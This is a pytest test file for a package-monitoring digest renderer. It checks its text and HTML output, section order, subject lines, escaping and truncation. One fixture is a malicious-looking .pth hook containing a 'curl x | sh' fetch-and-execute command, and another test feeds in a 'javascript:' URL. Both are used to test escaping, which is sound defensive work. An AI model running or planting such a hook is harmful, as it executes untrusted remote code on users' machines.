import os
import time
from pathlib import Path

import pytest

from fetter_scope import render
from fetter_scope.digest import fold
from fetter_scope.events import own, parse_line

from tests.test_digest import T0, hook, pc, pkg, report, run, scan, start, vuln

GOLDEN = Path(__file__).parent / "fixtures" / "golden"
STREAMS = Path(__file__).parent / "fixtures" / "streams"


@pytest.fixture(autouse=True)
def utc(monkeypatch):
    monkeypatch.setenv("TZ", "UTC")
    time.tzset()
    yield
    monkeypatch.undo()
    time.tzset()


def full_digest() -> dict:
    """Every section: the recorded streams, plus hooks, violations, transient and resolved items."""
    recorded = [parse_line(x).event for f in ("quiet", "changes")
                for x in (STREAMS / f"{f}.jsonl").read_text().splitlines()]
    t0 = recorded[0]["time"]["secs"]
    viol = {"ecosystem": "python", "package": "requests", "dependency": None,
            "explain": "Unrequired", "sites": ["/home/user/.venv/lib/python3.12/site-packages"]}
    extra = [
        report(t0 - T0 + 100, "alert",
               hooks=[hook("added", "sitecustomize.pth", "import os; os.system('curl x | sh')  # <b>"),
                      hook("removed", "old.pth", "import old")],
               new_violations=[viol],
               resolved_vulns=[{"package": pkg("minimist", "1.2.0"), "id": "GHSA-old"}],
               packages=[pc("added", "tmp-pkg", to="0.1"), pc("upgraded", "react", "18.2.0", "18.3.1")],
               origins=[{"change": "added", "ecosystem": "npm", "path": "/home/user/proj2"}]),
        report(t0 - T0 + 200, "changed", packages=[pc("removed", "tmp-pkg", frm="0.1")],
               new_vulns=[vuln("GHSA-tmp", "react", "18.3.1", score=4.0)]),
        report(t0 - T0 + 300, "changed",
               resolved_vulns=[{"package": pkg("react", "18.3.2"), "id": "GHSA-tmp"}],
               audit_error="OSV unavailable"),
        own("fetter-exit", now=t0 + 250, code=101, expected=False, restart_in=5).event,
    ]
    return fold(recorded + extra, t0 - 60, t0 + 3600, period=600)


def check_golden(name: str, actual: str):
    from fetter_scope import __version__
    actual = actual.replace(f"fetter-scope {__version__}", "fetter-scope VERSION")
    path = GOLDEN / name
    if os.environ.get("UPDATE_GOLDEN"):
        path.write_text(actual)
    assert actual == path.read_text(), f"{name} differs; UPDATE_GOLDEN=1 regenerates it"


def test_golden_text():
    check_golden("digest.txt", render.text(full_digest()))


def test_golden_html():
    check_golden("digest.html", render.html_body(full_digest()))


def test_section_order():
    titles = [s.title for s in render.sections(full_digest())]
    assert titles == ["Alerts", "New vulnerabilities", "New hooks", "Downgrades",
                      "New allow-list violations", "Alert reports", "Problems", "Transient",
                      "Changes", "npm · /home/user/proj/package-lock.json", "npm · /p",
                      "Origins and sites", "Resolved", "Resolved vulnerabilities",
                      "Removed hooks"]


def test_html_is_inline_styled_and_escaped():
    h = render.html_body(full_digest())
    assert "<style" not in h and "class=" not in h and "<svg" not in h
    assert "&lt;b&gt;" in h and "os.system(&#x27;curl x | sh&#x27;)" in h


def test_unsafe_url_not_linked():
    d = run(report(10, "alert", new_vulns=[vuln("X") | {"url": "javascript:alert(1)"}]))
    h = render.html_body(d)
    assert "href=" not in h and "javascript:alert(1)" not in h


@pytest.mark.parametrize("entries,expect", [
    ((report(10, "alert", new_vulns=[vuln("A"), vuln("B")], hooks=[hook("added")],
             packages=[pc("downgraded", "a", "2", "1"), pc("added", "b", to="1")]),),
     "fetter host · ALERT · 2 new vulns · 1 hook · 1 downgrade · 2 changes"),
    ((report(10, "unchanged"),), "fetter host · unchanged"),
    ((report(10, packages=[pc("added", "a", to="1")]), report(20, packages=[pc("removed", "a", frm="1")])),
     "fetter host · changed"),
])
def test_subject(entries, expect):
    assert render.subject(run(*entries)) == expect


def test_subject_prefix_and_problem():
    d = run(start(0, period=10), scan(1), window=(0, 500))
    assert render.subject(d, "box") == "box ? · 1 problem"


def test_fit_cuts_long_lists():
    d = run(report(10, packages=[pc("added", f"package-{i:05d}", to="1.0.0", site="/very/long/site/path")
                                 for i in range(3000)]))
    h, t, cap = render.fit(d)
    assert cap is not None and len(h.encode()) <= render.HTML_LIMIT
    assert f"and {3000 - cap} more" in h and f"- and {3000 - cap} more" in t
    small = run(report(10, packages=[pc("added", "a", to="1")]))
    assert render.fit(small)[2] is None


def test_nothing_changed():
    d = run(report(10, "unchanged"))
    assert "Nothing changed." in render.text(d)
    assert "attached as JSON" not in render.text(d, attached=False)


def test_span():
    assert render.span(T0, T0 + 600) == "2027-01-15 08:00–08:10"
    assert render.span(T0, T0) == "2027-01-15 08:00"
    assert render.span(T0, T0 + 86400) == "2027-01-15 08:00 – 2027-01-16 08:00"
